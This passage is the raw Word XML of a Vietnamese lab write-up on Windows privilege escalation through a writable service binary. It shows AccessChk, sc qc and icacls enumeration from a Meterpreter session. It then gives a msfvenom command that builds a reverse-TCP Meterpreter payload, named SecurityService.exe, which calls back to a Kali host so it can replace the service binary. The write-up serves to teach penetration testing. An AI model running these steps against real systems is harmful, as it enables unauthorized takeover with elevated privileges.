    <w:p w14:paraId="2B3A84E7" w14:textId="77777777" w:rsidR="00215C38" w:rsidRPr="00215C38" w:rsidRDefault="00215C38" w:rsidP="00215C38">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ls AccessChk</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C606078" w14:textId="77777777" w:rsidR="00215C38" w:rsidRPr="00215C38" w:rsidRDefault="00215C38">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BB98512" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tải AccessChk 64-bit từ Kali lên máy Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7732F50D" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260E12DF" w14:textId="77777777" w:rsidR="00215C38" w:rsidRDefault="00215C38">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>upload /home/kali/Downloads/AccessChk/accesschk64.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DA7494" w14:textId="02EFBACD" w:rsidR="00E571DD" w:rsidRDefault="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41DDF87B" wp14:editId="42C06731">
            <wp:extent cx="6152515" cy="795020"/>
            <wp:effectExtent l="0" t="0" r="635" b="5080"/>
            <wp:docPr id="149288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80519" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="795020"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="487E6AF6" w14:textId="7096F5BB" w:rsidR="00E571DD" w:rsidRDefault="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Lỗi này nghĩa là thư mục hiện tại trên Windows không cho tài khoản DumbUser ghi file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7B1581" w14:textId="77777777" w:rsidR="00E571DD" w:rsidRPr="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>tại meterpreter &gt; nhập lần lượt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F4C703" w14:textId="77777777" w:rsidR="00E571DD" w:rsidRPr="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>pwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A838D11" w14:textId="77777777" w:rsidR="00E571DD" w:rsidRPr="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>cd C:\\</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C789E2" w14:textId="77777777" w:rsidR="00E571DD" w:rsidRPr="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49019298" w14:textId="77777777" w:rsidR="00E571DD" w:rsidRPr="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>cd Users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C61B5D9" w14:textId="77777777" w:rsidR="00E571DD" w:rsidRPr="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>cd DumbUser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8A1D80" w14:textId="77777777" w:rsidR="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728D90F3" w14:textId="77777777" w:rsidR="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>cd Downloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6F8003" w14:textId="5385FED9" w:rsidR="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>pwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38EE708E" w14:textId="40BDB47F" w:rsidR="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48C2472D" wp14:editId="79EDDEEA">
            <wp:extent cx="6152515" cy="3688715"/>
            <wp:effectExtent l="0" t="0" r="635" b="6985"/>
            <wp:docPr id="167077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71993" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3688715"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AABBDD2" w14:textId="3B680CE4" w:rsidR="00E571DD" w:rsidRDefault="00E571DD" w:rsidP="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="21C34A44" wp14:editId="7DFB6E21">
            <wp:extent cx="6152515" cy="828675"/>
            <wp:effectExtent l="0" t="0" r="635" b="9525"/>
            <wp:docPr id="169453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3396" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="828675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE91343" w14:textId="77777777" w:rsidR="00E571DD" w:rsidRDefault="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="697D8AE2" w14:textId="4DCF5DA4" w:rsidR="00E571DD" w:rsidRPr="00E571DD" w:rsidRDefault="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="297EB0A3" w14:textId="474B1269" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>AccessChk là công cụ Sysinternals dùng để kiểm tra quyền truy cập đối với tệp, thư mục, Registry và dịch vụ trên Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4B1662" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Liệt kê các dịch vụ có cấu hình hoặc quyền truy cập yếu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A69E24" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A8D709" w14:textId="3C83E468" w:rsidR="00E571DD" w:rsidRPr="00E571DD" w:rsidRDefault="00E571DD">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E571DD">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">      shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0DC4AF" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00215C38" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00215C38">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>accesschk64.exe /accepteula -uwcqv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="713F6635" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tham số /accepteula tự động chấp nhận điều khoản sử dụng. Các tùy chọn còn lại giúp tìm dịch vụ mà người dùng hiện tại có quyền ghi hoặc thay đổi cấu hình.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21CD44A0" w14:textId="6F4659B3" w:rsidR="00F63D7F" w:rsidRDefault="00F63D7F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="78EC247B" wp14:editId="33885D1C">
            <wp:extent cx="6152515" cy="2510155"/>
            <wp:effectExtent l="0" t="0" r="635" b="4445"/>
            <wp:docPr id="55691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18572" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2510155"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2840EA2E" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Kiểm tra các tệp và thư mục mà nhóm Users có quyền ghi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D64A1FA" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A6E7A8" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00F63D7F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F63D7F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>accesschk64.exe -uwqs Users c:\*.*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36121131" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh quét ổ C để phát hiện những vị trí mà nhóm Users có quyền ghi. Đây có thể là cơ sở để thay thế tệp thực thi của một dịch vụ chạy quyền cao.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D9DE21" w14:textId="3B9740B4" w:rsidR="006A2813" w:rsidRDefault="00F63D7F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="349A0F69" wp14:editId="60D4F8B9">
            <wp:extent cx="6152515" cy="5243195"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="42415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59693" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="5243195"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>4. Phân tích dịch vụ SecurityService</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092B8B9B" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đọc cấu hình của dịch vụ SecurityService.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66977733" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC4BAB7" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00F63D7F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F63D7F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>sc qc SecurityService</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253BDA7F" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh sc qc hiển thị tên tệp thực thi, kiểu khởi động và tài khoản chạy dịch vụ. Cần chú ý đường dẫn C:\Program Files (x86)\PCProtect\SecurityService.exe.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0439EFB7" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Kiểm tra quyền NTFS trên tệp thực thi của dịch vụ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DADEE16" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54939B15" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00F63D7F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F63D7F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB14D58" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh icacls cho biết người dùng hoặc nhóm nào có quyền sửa, xóa hoặc thay thế SecurityService.exe.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F10534" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Đối chiếu tiến trình đang chạy với các dịch vụ Windows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A618CBC" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B60D0E7" w14:textId="77777777" w:rsidR="006A2813" w:rsidRPr="00F63D7F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F63D7F">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>tasklist /SVC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3B0822" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh hiển thị danh sách tiến trình và các dịch vụ liên quan, giúp xác nhận SecurityService đang hoạt động và xác định tiến trình chứa dịch vụ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7005EFA5" w14:textId="308E6099" w:rsidR="006A2813" w:rsidRDefault="00F63D7F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="611C92E4" wp14:editId="11A4BAF9">
            <wp:extent cx="6152515" cy="3841750"/>
            <wp:effectExtent l="0" t="0" r="635" b="6350"/>
            <wp:docPr id="96010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08780" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3841750"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>5. Tạo payload thay thế tệp dịch vụ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC78368" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tạo payload Meterpreter 64-bit có tên SecurityService.exe.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3708E700" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B92CA02" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.105 LPORT=4445 -f exe -o SecurityService.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795C94DA" w14:textId="77777777" w:rsidR="006A2813" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Msfvenom tạo tệp EXE kết nối ngược về máy Kali tại cổng 4445. Tệp được đặt cùng tên với tệp thực thi của dịch vụ để phục vụ bước thay thế.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CAE7FDD" w14:textId="77777777" w:rsidR="00EE2CCF" w:rsidRDefault="00EE2CCF">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B1B2898" wp14:editId="42FD259E">
            <wp:extent cx="6152515" cy="1118870"/>
            <wp:effectExtent l="0" t="0" r="635" b="5080"/>
            <wp:docPr id="156201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19026" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1118870"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="499292C4" w14:textId="32ED4606" w:rsidR="00EE2CCF" w:rsidRDefault="00EE2CCF">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="53A41FB5" wp14:editId="25B5E5B4">
            <wp:extent cx="6152515" cy="3033395"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="199803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34510" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
